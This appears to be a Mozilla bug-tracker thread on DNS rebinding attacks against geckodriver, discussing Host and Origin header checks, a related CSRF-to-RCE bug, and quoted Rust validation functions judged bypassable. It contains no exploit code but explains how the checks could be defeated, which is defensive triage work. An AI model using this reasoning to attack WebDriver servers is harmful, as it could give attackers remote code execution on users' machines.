By checking the value of the `Host` header and enforcing values such as

`localhost:4444`, we can prevent DNS rebinding attacks.

### HTTP-level Authentication

As previously discussed, adding (opt-in) HTTP-level authentication

would prevent a wide range of attacks (including attacks from local users)

if this feature were to be supported by WebDriver clients.

### PF\_LOCAL Socket

As previously discussed, adding an options for using PF\_LOCAL

socket would prevent a wide range of attacks

if this feature were to be supported by WebDriver clients.

AFAICT this is also fixed by checking the `Origin` header, since that's unconditionally set on POST requests and all sessions start with a `POST`. Therefore I'd expect the patches in [bug 1648964](/show_bug.cgi?id=1648964 "RESOLVED FIXED - CSRF to RCE in geckodriver") to also address this attack. It's straightfoward to also check the host header so I can make a patch to do that too unless we think it's unnecessary for whatever reason.

Check that the Host header is set and that the host and port are local

or match the address that the WebDriver server is running on.

Yes, indeed it should be fixed on modern browser by the patch checking `Origin`. I was not aware it was sent even for same-origin POST.

Did you test this against other implementations? It seems plausible that some other implementations that weren't susceptible to the RCE might allow you to get a user session with this approach, since you can get the session id and send further commands. In the worst case the WebDriver controlled browser might share state with normal user browser, giving remote access to user sessions (but I didn't check).

The status of other implementations regarding this is the same as for the CSRF vulnerablity. Chromiumdriver already checks the Host header and is thus not affected: Chromiumdriver-based implementations should not be affected as well. Selenium Server seems to be affected as well (and was contacted). I contacted Apple and do not know the state of their implementation for now.

Now that the fixes for 1648964 have been released, Geckodriver is mostly immune to DNS-rebinding attacks. This is because Geckodriver now checks that the Origin header is localhost (or 127.0.0.1, etc.). Therefore, DNS-rebinding should now only be possible for browsers which do not send the Origin header for same-origin POST requests.

I believe there are still a lot of browsers in the wild which do not send the Origin header in this case. Thus, I think it would still make sense to fix this by validating the Origin header as well.

I'm not confident that the host parsing in the patch is correct so I'd want to spend more time to get it right.

My feeling is that anyone using a client old enough to not send an Origin header with POST is likely harbouring more vunerablities than just this one, so I don't think it's very high priority to fix. But if someone from the security team has a different view please let me know :)

I also don't think this is "high priority".

I'm trusting James' judgement, but out of curiosity: Do we have an estimate of versions (or release-years) for those browsers that don't send the Origin header?

I assume this is a typo and Gabriel means "validating the Host header" (which James' patch does). We definitely should do that, it's the original defense against rebinding attacks.

sec-moderate seems reasonable with [bug 1648964](/show_bug.cgi?id=1648964 "RESOLVED FIXED - CSRF to RCE in geckodriver") fixed.

Now that the details of [bug 1648964](/show_bug.cgi?id=1648964 "RESOLVED FIXED - CSRF to RCE in geckodriver") ([CVE-2020-15660](https://www.cve.org/CVERecord?id=CVE-2020-15660)) are disclosed, it might lead malicious actors to this vulnerablity. Considering that the impact is RCE, it might be a good idea to fix this soonish.

While modern browsers should be immune to this attack, there are probably some other browsers (I'm thinking about things like embedded browsers in applications) which could be exploited.

I've added some comment in the commit "More explictly only allow connections from local origins" (D120387).

> If I understand this patch correctly, this does not look like a good idea. AFAUI, socket\_addrs() triggers an domain name resolution. If this is the case, "www.example.com" can definitely fool this check using DNS rebinding (TOCTOU).
>
> Nitpick: we are not even absolutely sure that the name resolution in the WebDriver client is the same as in the WebDriver server (for example, if the client is actually a browser using DoH).

As a summary, I'm wondering if this patch does not actually open up DNS-rebinding attacks.

Note: I did not actually test this commit yet.

No, it should actually be OK because of "Validate the Host header when starting GeckoDriver sessions" checks the Host header anyway (and the Content-Type check blocks cross-origin requests).

Concerning regression 1732622, it would be possible to always enable all literals IP addresses (in the Host header): it is not possible to conduct a DNS rebinding attacks through literal IP addresses. I guess for the Host header, we could:

* enable all literal addresses by default;
* enable localhost as well by default;
* enable extra values through some CLI option.

Concerning the Origin header, I don't believe it's absolutely necessary to keep this verification: it's not necessary for DNS-rebinding protection and CSRF protection is already provided by the the Content-Type check.

Commit 29aa1f68eba3e296a3cb44d2b8701f60233c992b is probably not necessary.

|  | |

I checked the current version of the code and I believe this is still vulnerable to DNS rebinding attacks.

The verification of the Host header uses this function:

```
fn host_and_port_match_server(
    server_host: &Host,
    server_address: &SocketAddr,
    header_host_port: (Host, Option<u16>),
) -> bool {
    // Validate that the result of parsing the Host header matches the server configuration

    // If there's no port we're a HTTP server so default to 80
    let host = header_host_port.0;
    let port = header_host_port.1.unwrap_or(80);
    let host_matches = if host_is_local(server_host) && host_is_local(&host) {
        // If both the host header and the server are standard loopback names,
        // accept the match. This means that the server can bind to 127.0.0.1 and
        // the request can be for http://localhost for example
        true
    } else if host == *server_host {
        match host {
            Host::Domain(ref domain) => {
                // For a domain we also check that the ip matches
                (domain.to_string(), port)
                    .to_socket_addrs()
                    .map(|addr_iter| {
                        addr_iter
                            .map(|addr| addr.ip())
                            .any(|ip| ip == server_address.ip())
                    })
                    .unwrap_or(false)
            }
            Host::Ipv4(_) | Host::Ipv6(_) => true,
        }
    } else {
        false
    };
    let port_matches = server_address.port() == port;
    host_matches && port_matches
}

```

If a domain name is used, we check *all* the IP addresses the host name resolves to. If any of these addresses is a localhost address, this verification is passing. This verification does not protect against DNS rebinding attacks.

Another verification is done using the Origin header:

```
fn origin_is_local(url_str: &str) -> WebDriverResult<bool> {
    // Validate that the URL string from an Origin header corresponds to a local interface
    let make_err = || {
        WebDriverError::new(
            ErrorStatus::UnknownError,
            format!("Invalid Origin {}", url_str),
        )
    };

    let url = Url::parse(&url_str).map_err(|_| make_err())?;
    let sockets = url.socket_addrs(|| None).map_err(|_| make_err())?;

    Ok(!sockets.is_empty() && sockets.iter().all(|x| x.ip().is_loopback())) // <- vulnerable to DNS rebinding attacks
}

```

However, this verification is vulnerable to DNS rebinding attacks: the DNS response obtained by the browser first DNS request may be different than the one obtained by GeckoDriver.

In conclusion, I believe that both verifications fail to completely protect against DNS rebinding attacks.

I verified against the latest version : the Host header verification is protecting correctly against DNS rebinding (as long server\_host is not a domain name resolved using the DNS) thanks to `if host_is_local(server_host) && host_is_local(&host)` and `if host == *server_host`.

Sorry for the delay here. We ran out of CVE ids and needed to change our process for renewals.

I|ll defer to Henrik and James wrt to disclosure. I believe they are in the process of updating the release notes for 0.30.0.
